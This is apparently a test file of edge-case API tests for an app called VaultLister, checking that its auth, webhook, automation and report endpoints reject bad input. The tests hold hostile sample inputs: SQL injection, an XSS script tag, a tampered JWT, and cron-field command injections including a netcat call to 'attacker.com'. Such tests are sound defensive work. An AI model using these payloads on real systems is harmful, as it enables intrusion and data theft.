// Edge case tests for existing functionality
// Covers: auth edge cases, webhook edge cases, automation edge cases, report edge cases
import { describe, expect, test, beforeAll } from 'bun:test';
import crypto from 'crypto';

const BASE_URL = `http://localhost:${process.env.PORT || 3000}/api`;
let authToken = null;

beforeAll(async () => {
    const response = await fetch(`${BASE_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            email: 'demo@vaultlister.com',
            password: 'DemoPassword123!'
        })
    });
    const data = await response.json();
    authToken = data.token;
});

describe('Auth Edge Cases', () => {
    test('should reject SQL injection in email field', async () => {
        const response = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: "admin' OR '1'='1",
                password: 'anything'
            })
        });
        expect([400, 401, 429]).toContain(response.status);
    });

    test('should handle extremely long email', async () => {
        const longEmail = 'a'.repeat(500) + '@test.com';
        const response = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: longEmail,
                password: 'TestPassword123!'
            })
        });
        expect([400, 401, 429]).toContain(response.status);
    });

    test('should handle empty body on login', async () => {
        const response = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: '{}'
        });
        expect([400, 401, 429]).toContain(response.status);
    });

    test('should handle malformed JSON on login', async () => {
        const response = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: 'not-json-at-all'
        });
        expect([400, 422, 429]).toContain(response.status);
    });

    test('should treat email as case-insensitive', async () => {
        const response = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: 'DEMO@VAULTLISTER.COM',
                password: 'DemoPassword123!'
            })
        });
        // 200 = case-insensitive match, 429 = rate limited
        expect([200, 429]).toContain(response.status);
        if (response.status === 200) {
            const data = await response.json();
            expect(data.token).toBeDefined();
        }
    });

    test('should reject token with tampered payload', async () => {
        if (!authToken) return;
        const parts = authToken.split('.');
        if (parts.length !== 3) return;
        const tampered = parts[0] + '.' + parts[1].slice(0, -1) + 'X' + '.' + parts[2];
        const response = await fetch(`${BASE_URL}/auth/me`, {
            headers: { 'Authorization': `Bearer ${tampered}` }
        });
        expect(response.status).toBe(401);
    });

    test('should reject expired-format token', async () => {
        const response = await fetch(`${BASE_URL}/auth/me`, {
            headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0IiwiZXhwIjoxfQ.invalid' }
        });
        expect([401, 429]).toContain(response.status);
    });

    test('should reject XSS in registration username', async () => {
        const response = await fetch(`${BASE_URL}/auth/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: `xss_${Date.now()}@test.com`,
                password: 'TestPassword123!',
                username: '<script>alert(1)</script>',
                fullName: 'Test'
            })
        });
        if (response.status === 201) {
            const data = await response.json();
            // If accepted, stored safely — XSS prevention at render
            expect(data.user).toBeDefined();
        } else {
            expect([400, 422, 429]).toContain(response.status);
        }
    });
});

describe('Webhook Edge Cases', () => {
    test('should reject webhook endpoint with empty name', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: '',
                url: 'https://example.com/hook'
            })
        });
        expect([400, 422]).toContain(response.status);
    });

    test('should reject webhook endpoint with no URL', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: 'no-url-test'
            })
        });
        expect(response.status).toBe(400);
    });

    test('should handle webhook upsert (same name updates existing)', async () => {
        if (!authToken) return;
        const uniqueName = `upsert_test_${Date.now()}`;

        const res1 = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: uniqueName,
                url: 'https://example.com/hook1',
                events: ['sale.created']
            })
        });
        const data1 = await res1.json();
        const secret1 = data1.secret || data1.endpoint?.secret;
        expect(res1.status).toBe(201);

        const res2 = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: uniqueName,
                url: 'https://example.com/hook2',
                events: ['order.shipped']
            })
        });
        const data2 = await res2.json();
        const secret2 = data2.secret || data2.endpoint?.secret;
        expect(res2.status).toBe(201);
        if (secret1 && secret2) {
            expect(secret2).not.toBe(secret1);
        }
    });
});

describe('Automation Edge Cases', () => {
    test('should reject automation with invalid type', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/automations`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: 'Invalid Type Test',
                type: 'nonexistent_type',
                schedule: '0 9 * * *',
                config: {}
            })
        });
        expect([400, 422]).toContain(response.status);
    });

    test('should handle automation toggle on non-existent rule', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/automations/00000000-0000-0000-0000-000000000000/toggle`, {
            method: 'PUT',
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        expect(response.status).toBe(404);
    });

    test('should reject cron with command injection via backticks', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/automations`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: 'Backtick Cron',
                type: 'custom',
                schedule: '`whoami` * * * *',
                config: {}
            })
        });
        expect([400, 422]).toContain(response.status);
    });

    test('should reject cron with pipe injection', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/automations`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: 'Pipe Cron',
                type: 'custom',
                schedule: '* * * * * | nc attacker.com 4444',
                config: {}
            })
        });
        expect([400, 422]).toContain(response.status);
    });
});

describe('Report Edge Cases', () => {
    test('should handle report with unknown widget type', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/reports`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                name: 'Unknown Widget Report ' + Date.now(),
                widgets: [{ type: 'nonexistent_widget', order: 0 }]
            })
        });
        expect([201, 400]).toContain(response.status);
    });

    test('should handle report generation with reversed date range', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/reports/generate`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                widgets: [{ type: 'revenue_chart' }],
                startDate: '2025-12-31',
                endDate: '2025-01-01'
            })
        });
        expect([200, 400]).toContain(response.status);
    });

    test('should handle report generation with malformed dates', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/reports/generate`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                widgets: [{ type: 'revenue_chart' }],
                startDate: 'not-a-date',
                endDate: 'also-not-a-date'
            })
        });
        expect([200, 400]).toContain(response.status);
    });

    test('should handle custom query with quoted table names', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/reports/query`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                sql: 'SELECT * FROM "inventory"'
            })
        });
        expect([200, 403]).toContain(response.status);
    });

    test('should block subquery accessing disallowed tables', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/reports/query`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${authToken}`
            },
            body: JSON.stringify({
                sql: 'SELECT * FROM inventory WHERE id IN (SELECT id FROM users)'
            })
        });
        expect([400, 403]).toContain(response.status);
    });
});

describe('Inventory Edge Cases', () => {
    test('should handle zero limit gracefully', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/inventory-import/jobs?limit=0`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        expect(response.status).toBe(200);
    });

    test('should handle string offset gracefully', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/inventory-import/jobs?offset=abc&limit=10`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        expect(response.status).toBe(200);
    });

    test('should handle float limit gracefully', async () => {
        if (!authToken) return;
        const response = await fetch(`${BASE_URL}/inventory-import/jobs?limit=10.5`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
        });
        expect(response.status).toBe(200);
    });
});
